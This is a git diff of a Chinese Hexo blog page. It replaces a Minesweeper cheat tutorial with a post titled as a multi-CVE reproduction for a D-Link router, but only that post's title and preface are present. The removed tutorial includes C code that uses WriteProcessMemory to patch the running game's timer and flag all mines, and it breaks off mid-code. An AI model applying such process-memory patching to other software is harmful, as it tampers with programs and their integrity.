@@ -8,45 +8,64 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://foxcookie.github.io">
-  <title>扫雷辅助 | 凉生霜气清，月上灯火明</title>
+  <title>D-Link_GORTAC750多漏洞复现 | 凉生霜气清，月上灯火明</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="1. 介绍偶然见看到了好久以前存的想要复现的扫雷教程，突然发现已经过去那么久了啊。刚好趁着最近有时间，上手AK一波，让我也来感受下当初那些大佬们屠榜的快乐！！！ 哦，对了。前提声明，本文的所有脚本都是建立在大佬的基础上来的，因为我太菜了。。。">
+  <meta name="description" content="1. 前言D-Link_GORTAC750多CVE漏洞的复现，东西写的比较拉跨，凑合看吧。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="扫雷辅助">
-<meta property="og:url" content="https://foxcookie.github.io/2022/01/28/%E6%89%AB%E9%9B%B7%E8%BE%85%E5%8A%A9/index.html">
+<meta property="og:title" content="D-Link_GORTAC750多漏洞复现">
+<meta property="og:url" content="https://foxcookie.github.io/2023/08/23/D-Link_GORTAC750%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="凉生霜气清，月上灯火明">
-<meta property="og:description" content="1. 介绍偶然见看到了好久以前存的想要复现的扫雷教程，突然发现已经过去那么久了啊。刚好趁着最近有时间，上手AK一波，让我也来感受下当初那些大佬们屠榜的快乐！！！ 哦，对了。前提声明，本文的所有脚本都是建立在大佬的基础上来的，因为我太菜了。。。">
+<meta property="og:description" content="1. 前言D-Link_GORTAC750多CVE漏洞的复现，东西写的比较拉跨，凑合看吧。">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431843.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431844.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431845.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431846.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431847.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431848.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431849.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431850.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431851.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431852.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431853.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431854.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431855.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431856.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431857.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431858.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431859.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431860.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431861.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431862.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431863.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431864.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431865.png">
-<meta property="article:published_time" content="2022-01-28T06:21:56.000Z">
-<meta property="article:modified_time" content="2023-02-12T06:32:18.056Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015525.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015527.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015528.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015529.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015530.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015531.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015532.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015533.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015534.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015535.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015537.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015538.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015539.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015540.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015541.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015542.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015543.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015544.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015545.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015546.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015547.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015548.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015549.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015550.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015551.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015552.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015553.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015554.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015555.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015556.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015557.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015558.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015559.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015560.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015561.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015562.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015563.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015564.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015565.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015566.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015567.png">
+<meta property="article:published_time" content="2023-08-23T07:44:27.000Z">
+<meta property="article:modified_time" content="2023-09-15T02:16:24.803Z">
 <meta property="article:author" content="foxcookie">
-<meta property="article:tag" content="扫雷">
-<meta property="article:tag" content="游戏">
+<meta property="article:tag" content="IOT">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431843.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202309151015525.png">
   
     <link rel="alternative" href="/atom.xml" title="凉生霜气清，月上灯火明" type="application/atom+xml">
   
@@ -193,121 +212,225 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-扫雷辅助" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-D-Link_GORTAC750多漏洞复现" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      扫雷辅助
+      D-Link_GORTAC750多漏洞复现
     </h1>
   
 
         
-        <a href="/2022/01/28/%E6%89%AB%E9%9B%B7%E8%BE%85%E5%8A%A9/" class="archive-article-date">
-  	<time datetime="2022-01-28T06:21:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-28</time>
+        <a href="/2023/08/23/D-Link_GORTAC750%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
+  	<time datetime="2023-08-23T07:44:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-08-23</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. <strong>介绍</strong></h1><p>偶然见看到了好久以前存的想要复现的扫雷教程，突然发现已经过去那么久了啊。刚好趁着最近有时间，上手AK一波，让我也来感受下当初那些大佬们<strong>屠榜</strong>的快乐！！！</p>
-<p>哦，对了。<strong>前提声明，本文的所有脚本都是建立在大佬的基础上来的</strong>，因为我太菜了。。。</p>
+        <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>D-Link_GORTAC750多CVE漏洞的复现，东西写的比较拉跨，凑合看吧。</p>
 <a id="more"></a>
 
-<h1 id="2-时间修改实现"><a href="#2-时间修改实现" class="headerlink" title="2. 时间修改实现"></a>2. 时间修改实现</h1><h2 id="2-1-时间清零实现"><a href="#2-1-时间清零实现" class="headerlink" title="2.1 时间清零实现"></a>2.1 时间清零实现</h2><p>扫雷这个游戏大家都很熟悉了，就是根据出现的数字来判断周围的雷点，然后标注出来，给它插上咱的小红旗。</p>
-<p>先上OD，把我们的扫雷跑起来</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431843.png" alt="image-20220125173300654"></p>
-<p>接下来，我们要做的就是定位到存储时间的基址。CE大法好啊</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431844.png" alt="image-20220125173402603"></p>
-<p>初始未开始状态为0，搜索0这个数值，结果很多，不过不要慌。</p>
-<p>因为我们一旦点了开始，那么扫雷的秒数就会不断+1，这样很不利于我们分析。不过，我们自有对策，我们可以直接把游戏打输啊，直接点到雷爆掉，时间不就可以停止了吗？（机智如我.jpg）</p>
-<p>嗯哼，点爆了，变成了4秒</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431845.png" alt="image-20220125173629980"></p>
-<p>上CE修改数值，再次扫描</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431846.png" alt="image-20220125173744965"></p>
-<p>这次可以看到结果少了很多，有5个固定基址有可能是我们存储时间的地方。</p>
-<p>现在结果依旧不确定，但是我们可以重复上述操作啊，重置游戏，继续搜索嘛。</p>
-<p>当我们数值清0的时候，可以一眼看出，这里的数值进行了改变，所以我们的结果就是它了~~~</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431847.png" alt="image-20220125173941797"></p>
-<p>为了确定这个地址的正确性，我们直接修改下它的数值来看下</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431848.png" alt="image-20220125174132780"></p>
-<p>嗯~~~ 很好，就是它了。</p>
-<p>既然找到了这个地方，那我们要做的就很简单了，让它的数值清0就完事了？不过真的会这么简单吗？</p>
-<p>当然不会啦~~~</p>
-<p>因为扫雷的时间是累加的，所以我们要想让它的数值彻底清0，还需要修改它的逻辑。不过在这小节里我们暂时不讨论这个，我们只单纯的修改时间。</p>
-<p>当然，每次修改时间还要开CE好麻烦的说，所以，我们这里可以搞个脚本啊。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD Pid;</span><br><span class="line">	HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">	DWORD timeAddress = <span class="number">0x0100579C</span>;</span><br><span class="line">	WORD Time = <span class="number">0</span>;</span><br><span class="line">	DWORD result1;</span><br><span class="line">	HWND hWnd = FindWindow(<span class="literal">NULL</span>, <span class="string">&quot;扫雷&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWnd != <span class="number">0</span>) &#123;</span><br><span class="line">		GetWindowThreadProcessId(hWnd, &amp;Pid);</span><br><span class="line">		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">		<span class="keyword">if</span> (hProcess == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Open process failed.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		result1 = WriteProcessMemory(hProcess, (LPVOID)timeAddress, &amp;Time, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (result1 == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Time modify failed.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Modify Success.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>欸嘿，脚本一跑，时间清0。（这里的1是因为又开始计数了，我截图肯定截不了这么快的）</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431849.png" alt="image-20220125174808890"></p>
-<h2 id="2-2-时间停止实现"><a href="#2-2-时间停止实现" class="headerlink" title="2.2 时间停止实现"></a>2.2 时间停止实现</h2><p>上面我们也说了啊，让时间清0并不能让我们完成<strong>屠榜！！！</strong>的壮举，所以我们需要修改它的计时逻辑来完成这一伟大的目标。</p>
-<p>当然，首先还是要掏出我们万能的OD，然后在数据窗口中定位到我们在上面用CE获取到的地址<code>0100579C</code></p>
-<p>（PS：做出OD和IDA的人真是神仙啊，CE更是早些年不可割舍的回忆呢。）</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431850.png" alt="image-20220125175345557"></p>
-<p>可以看到，我们的时间在随着扫雷中时间的跳动而改变。</p>
-<p>既然已经确定了地址了，后面的就简单很多了啊。直接对我们这个地址下一个<strong>写入断点</strong></p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431851.png" alt="image-20220125175506361"></p>
-<p>断点下完后，发现我们的程序断在了<code>0x01002FF5</code>这个地址处。而且可以看到这行代码的意思是让<code>0x0100579C</code>地址处的数值累加1，所以不用看了，就是它了。（当然，不放心也可以在点两下运行，分析分析。看看是不是运行完这行代码后，扫雷时间数值+1）</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431852.png" alt="image-20220125175542234"></p>
-<p>那么接下来我们要做的就是将这行代码nop掉。这里我们可以直接借助OD来进行操作，但是我今天不想这么干，大佬的脚本实在是太让我心动了。所以我要  上！脚！！本！！！</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD Pid;</span><br><span class="line">	HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">	DWORD incAddress = <span class="number">0x01002FF5</span>;</span><br><span class="line">	<span class="keyword">char</span> inc[<span class="number">6</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;</span><br><span class="line">	DWORD result1;</span><br><span class="line">	HWND hWnd = FindWindow(<span class="literal">NULL</span>, <span class="string">&quot;扫雷&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWnd != <span class="number">0</span>) &#123;</span><br><span class="line">		GetWindowThreadProcessId(hWnd, &amp;Pid);</span><br><span class="line">		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">		<span class="keyword">if</span> (hProcess == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Open process failed.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		result1 = WriteProcessMemory(hProcess, (LPVOID)incAddress, &amp;inc, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (result1 == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Inc modify failed.\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Modify Success.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431853.png" alt="image-20220125180213648"></p>
-<p>欸嘿，脚本跑完后，OD中看到的这行累加代码果然被nop掉了，舒服啊~~~</p>
-<p>而且可以看到，我们的时间也不增加了欸</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431854.png" alt="image-20220126111437269"></p>
-<p>让我们先将我们上一步的修改结果保存下来。</p>
-<p>但是！！！在我们运行保存下来的程序时，我们发现时间会加1，这说明扫雷程序并不是完全通过我们nop掉的那行代码实现时间累加的。</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431855.png" alt="image-20220126111918733"></p>
-<p>看来我们需要掏出我们的OD在给它点教训了！</p>
-<p>将修改后的扫雷程序载入OD，继续在<code>0100579C</code>处下一个内存访问断点，然后运行</p>
-<p>在游戏中点击任意一个小方块，然后！！！我们又发现了一处对时间+1的操作</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431856.png" alt="image-20220126112326331"></p>
-<p>运行跑起来测试后得知，这行代码就是我们要找的地方。把它nop掉即可实现0s扫雷</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431857.png" alt="image-20220126112451615"></p>
-<p>哦，对了。这里也可以用脚本，直接把上面的脚本修改一下，添个地址就好。改后的脚本就不放了，大佬博客里有。</p>
-<p>总结一下，扫雷里一共有两处对时间进行+1的操作。一处是在我们第一次点击的时候，另外一处是程序跑起来之后，所以我们修改的话两处都要修改才可以。这也从侧面反映出了，为什么当初榜上会有一堆1s的大佬，emmmmm，仿佛明白了什么呢（滑稽.jpg）</p>
-<hr>
-<h1 id="3-一键扫雷实现"><a href="#3-一键扫雷实现" class="headerlink" title="3. 一键扫雷实现"></a>3. 一键扫雷实现</h1><h2 id="3-1-自动标注地雷分布"><a href="#3-1-自动标注地雷分布" class="headerlink" title="3.1 自动标注地雷分布"></a>3.1 自动标注地雷分布</h2><p>下面我们继续上面的过程来分析。这里我们还拿原版的扫雷程序，因为里面有很多下好的断点，方便些。</p>
-<p>这里载入OD后，我们直接一路F8，让程序跑起来。随意选中一个方格点击（这里随意算了2行3列）</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431858.png" alt="image-20220127145056631"></p>
-<p>程序成功断在了方格中显示出字符之前，我们继续往下分析</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431859.png" alt="image-20220127145200819"></p>
-<p>这两行分别将我们鼠标点击的<code>列和行</code>赋值给了寄存器，可以通过不断变换点击位置确定</p>
-<p>继续往下运行，我们发现了一处很有意思的代码</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431860.png" alt="image-20220127145747254"></p>
-<p>这块代码的作用，就是将我们鼠标点击位置的状态存入数据段中。因为由前面可知，<code>EAX和ECX</code>是取了我们鼠标点击的位置，这里将ECX赋值给了EDX，然后循环左移5位。接着以<code>0x1005340</code>为基址进行了偏移，由此可见，<code>0x1005340</code>就是我们存放雷区表的地址。</p>
-<p>往下运行至<code>0x10038B1</code>处后，雷区中成功显示出了字符，在数据窗口中，我们也成功看到了我们所存放的数值</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431861.png" alt="image-20220127150252191"></p>
-<p>另外，网上翻下数据窗口的数据，还可以看到很有意思的数据</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431862.png" alt="image-20220127171353987"></p>
-<p>看到这三个数据是不是很意外呢，0xA，一共10个雷，9×9的方格，是不是和我们的初级扫雷一样呢。</p>
-<p>更改扫雷模式也可以看到，这三个数据在不断改变，可以确定这三个数据就是扫雷的长宽和雷数。</p>
-<p>反复测试，仔细观察数据窗口的雷区数据，其实可以得到很多东西。比如<code>10</code>是边框，<code>0F</code>是未开启的方格，<code>8F</code>是雷，<code>8E</code>是插得棋子，然后我们可以提取出我们的雷区数据（因为反复调试了很多次，所以这里就用以前提出来的一个数据啦，还请见谅）</p>
-<p><img src="https://raw.githubusercontent.com/foxcookie/Picture/main/img/202302121431863.png" alt="image-20220127172649320"></p>
-<p>这样就可以很方便的看出来，里面9×9的数据。</p>
-<p>但是！！！到了这里还有一个很重要的问题，我们的<strong>雷区</strong>初始化有两种情况。一种是在我们打开游戏后，雷区自动被初始化，此时雷区位置是一种情况。但是，当我们对雷区中任一方格点击的时候，我们的雷区会再一次被初始化，生成新的雷区，这时的雷区才是真正的雷区。</p>
-<p>那么问题来了，我们该怎样获得最后的雷区来进行标记呢？这里其实取巧了的，因为如果我们不点击方块，那么雷区就不会被再次初始化，所以我们可以直接标注出所有的雷，给它插上小旗子。</p>
-<p>那么，这里我们再次借助大佬的脚本。<strong>（哦，对了。这里要说明下，大佬原文的脚本是C++的。我这里是用的C，在VC6.0编译器里，C对字符的定义需要放在main函数开头，不能什么时候用什么时候定义。但是C++貌似要求不严格，可以这么做）</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD Pid = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">	DWORD dwHeight = <span class="number">0</span>, dwWidth = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 存放雷区的起始地址</span></span><br><span class="line">	DWORD dwBoomAddr = <span class="number">0x01005340</span>;</span><br><span class="line">	<span class="comment">// 雷区的最大值（包含边界）</span></span><br><span class="line">	DWORD dwSize = <span class="number">832</span>;</span><br><span class="line">	PBYTE pByte = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwTmpAddr = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 标记雷区值</span></span><br><span class="line">	BYTE bClear = <span class="number">0x8E</span>;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n = dwSize;</span><br><span class="line">	RECT rt;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取扫雷游戏对应的窗口句柄</span></span><br><span class="line">	HWND hWnd = FindWindow(<span class="literal">NULL</span>, <span class="string">&quot;扫雷&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWnd != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//获取扫雷进程ID</span></span><br><span class="line">		GetWindowThreadProcessId(hWnd, &amp;Pid);</span><br><span class="line">		<span class="comment">//打开扫雷游戏获取其句柄</span></span><br><span class="line">		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class="line">		<span class="keyword">if</span> (hProcess == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Open winmine process failed.&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		pByte = (PBYTE)<span 